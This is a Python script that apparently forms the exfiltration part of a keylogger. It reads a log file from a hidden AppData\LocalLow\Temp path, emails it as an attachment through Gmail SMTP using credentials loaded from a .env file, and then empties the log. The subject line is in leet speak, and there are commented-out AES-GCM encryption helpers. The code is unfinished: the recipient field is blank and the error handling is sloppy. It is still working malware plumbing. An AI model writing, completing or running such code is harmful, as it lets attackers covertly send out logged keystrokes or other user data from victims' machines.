import smtplib
from email.message import EmailMessage
import mimetypes
import os
from dotenv import load_dotenv
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import getpass
import threading

load_dotenv()

#decrypt variables using
def send_email():
    # grab 
    user = getpass.getuser()
    #Generate a secure 32-byte key (256 bits)
    # key = AESGCM.generate_key(bit_length=256)

    #grab email credientials from .env file
    EMAIL = os.getenv('USER_NAME')
    PASS = os.getenv('PASSWORD')

    # user_decrypt = str()
    # pass_decrypt = str()
    # Create the message object
    msg = EmailMessage()
    msg['Subject'] = "M41L!"
    msg['From'] = EMAIL
    msg['To'] =""
    msg.set_content("Y0U'v3 G0T M41L!")

    # Add attachment using mimetypes to guess the content type
    path = ("C:\\Users\\{}\\AppData\\LocalLow\\Temp\\log.txt").format(user)
    ctype, _ = mimetypes.guess_type(path)
    maintype, subtype = (ctype or 'application/octet-stream').split('/', 1)

    with open(path, 'rb') as f:
        msg.add_attachment(f.read(), maintype=maintype, subtype=subtype, filename=path)

    #decrypt
    # Send the email
    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(EMAIL, PASS)
            server.send_message(msg)
    except:
        print(f"An unexpected error occurred: {server}") 

    #create new file
    with open(path,"w") as f:
        pass 

    #clear file



# def encrypt_text(plaintext, key):
#     # Generate a random 12-byte nonce (standard for GCM)
#     nonce = os.urandom(12)
#     aesgcm = AESGCM(key)
#     # Encrypt and get ciphertext with authentication tag
#     ciphertext = aesgcm.encrypt(nonce, plaintext.encode(), None)
#     # Return nonce + ciphertext combined for storage/transmission
#     return nonce + ciphertext

# def decrypt_text(encrypted_data, key):
#     # Extract the 12-byte nonce from the beginning
#     nonce = encrypted_data[:12]
#     ciphertext = encrypted_data[12:]
#     aesgcm = AESGCM(key)
#     # Decrypt and verify integrity
#     return aesgcm.decrypt(nonce, ciphertext, None).decode()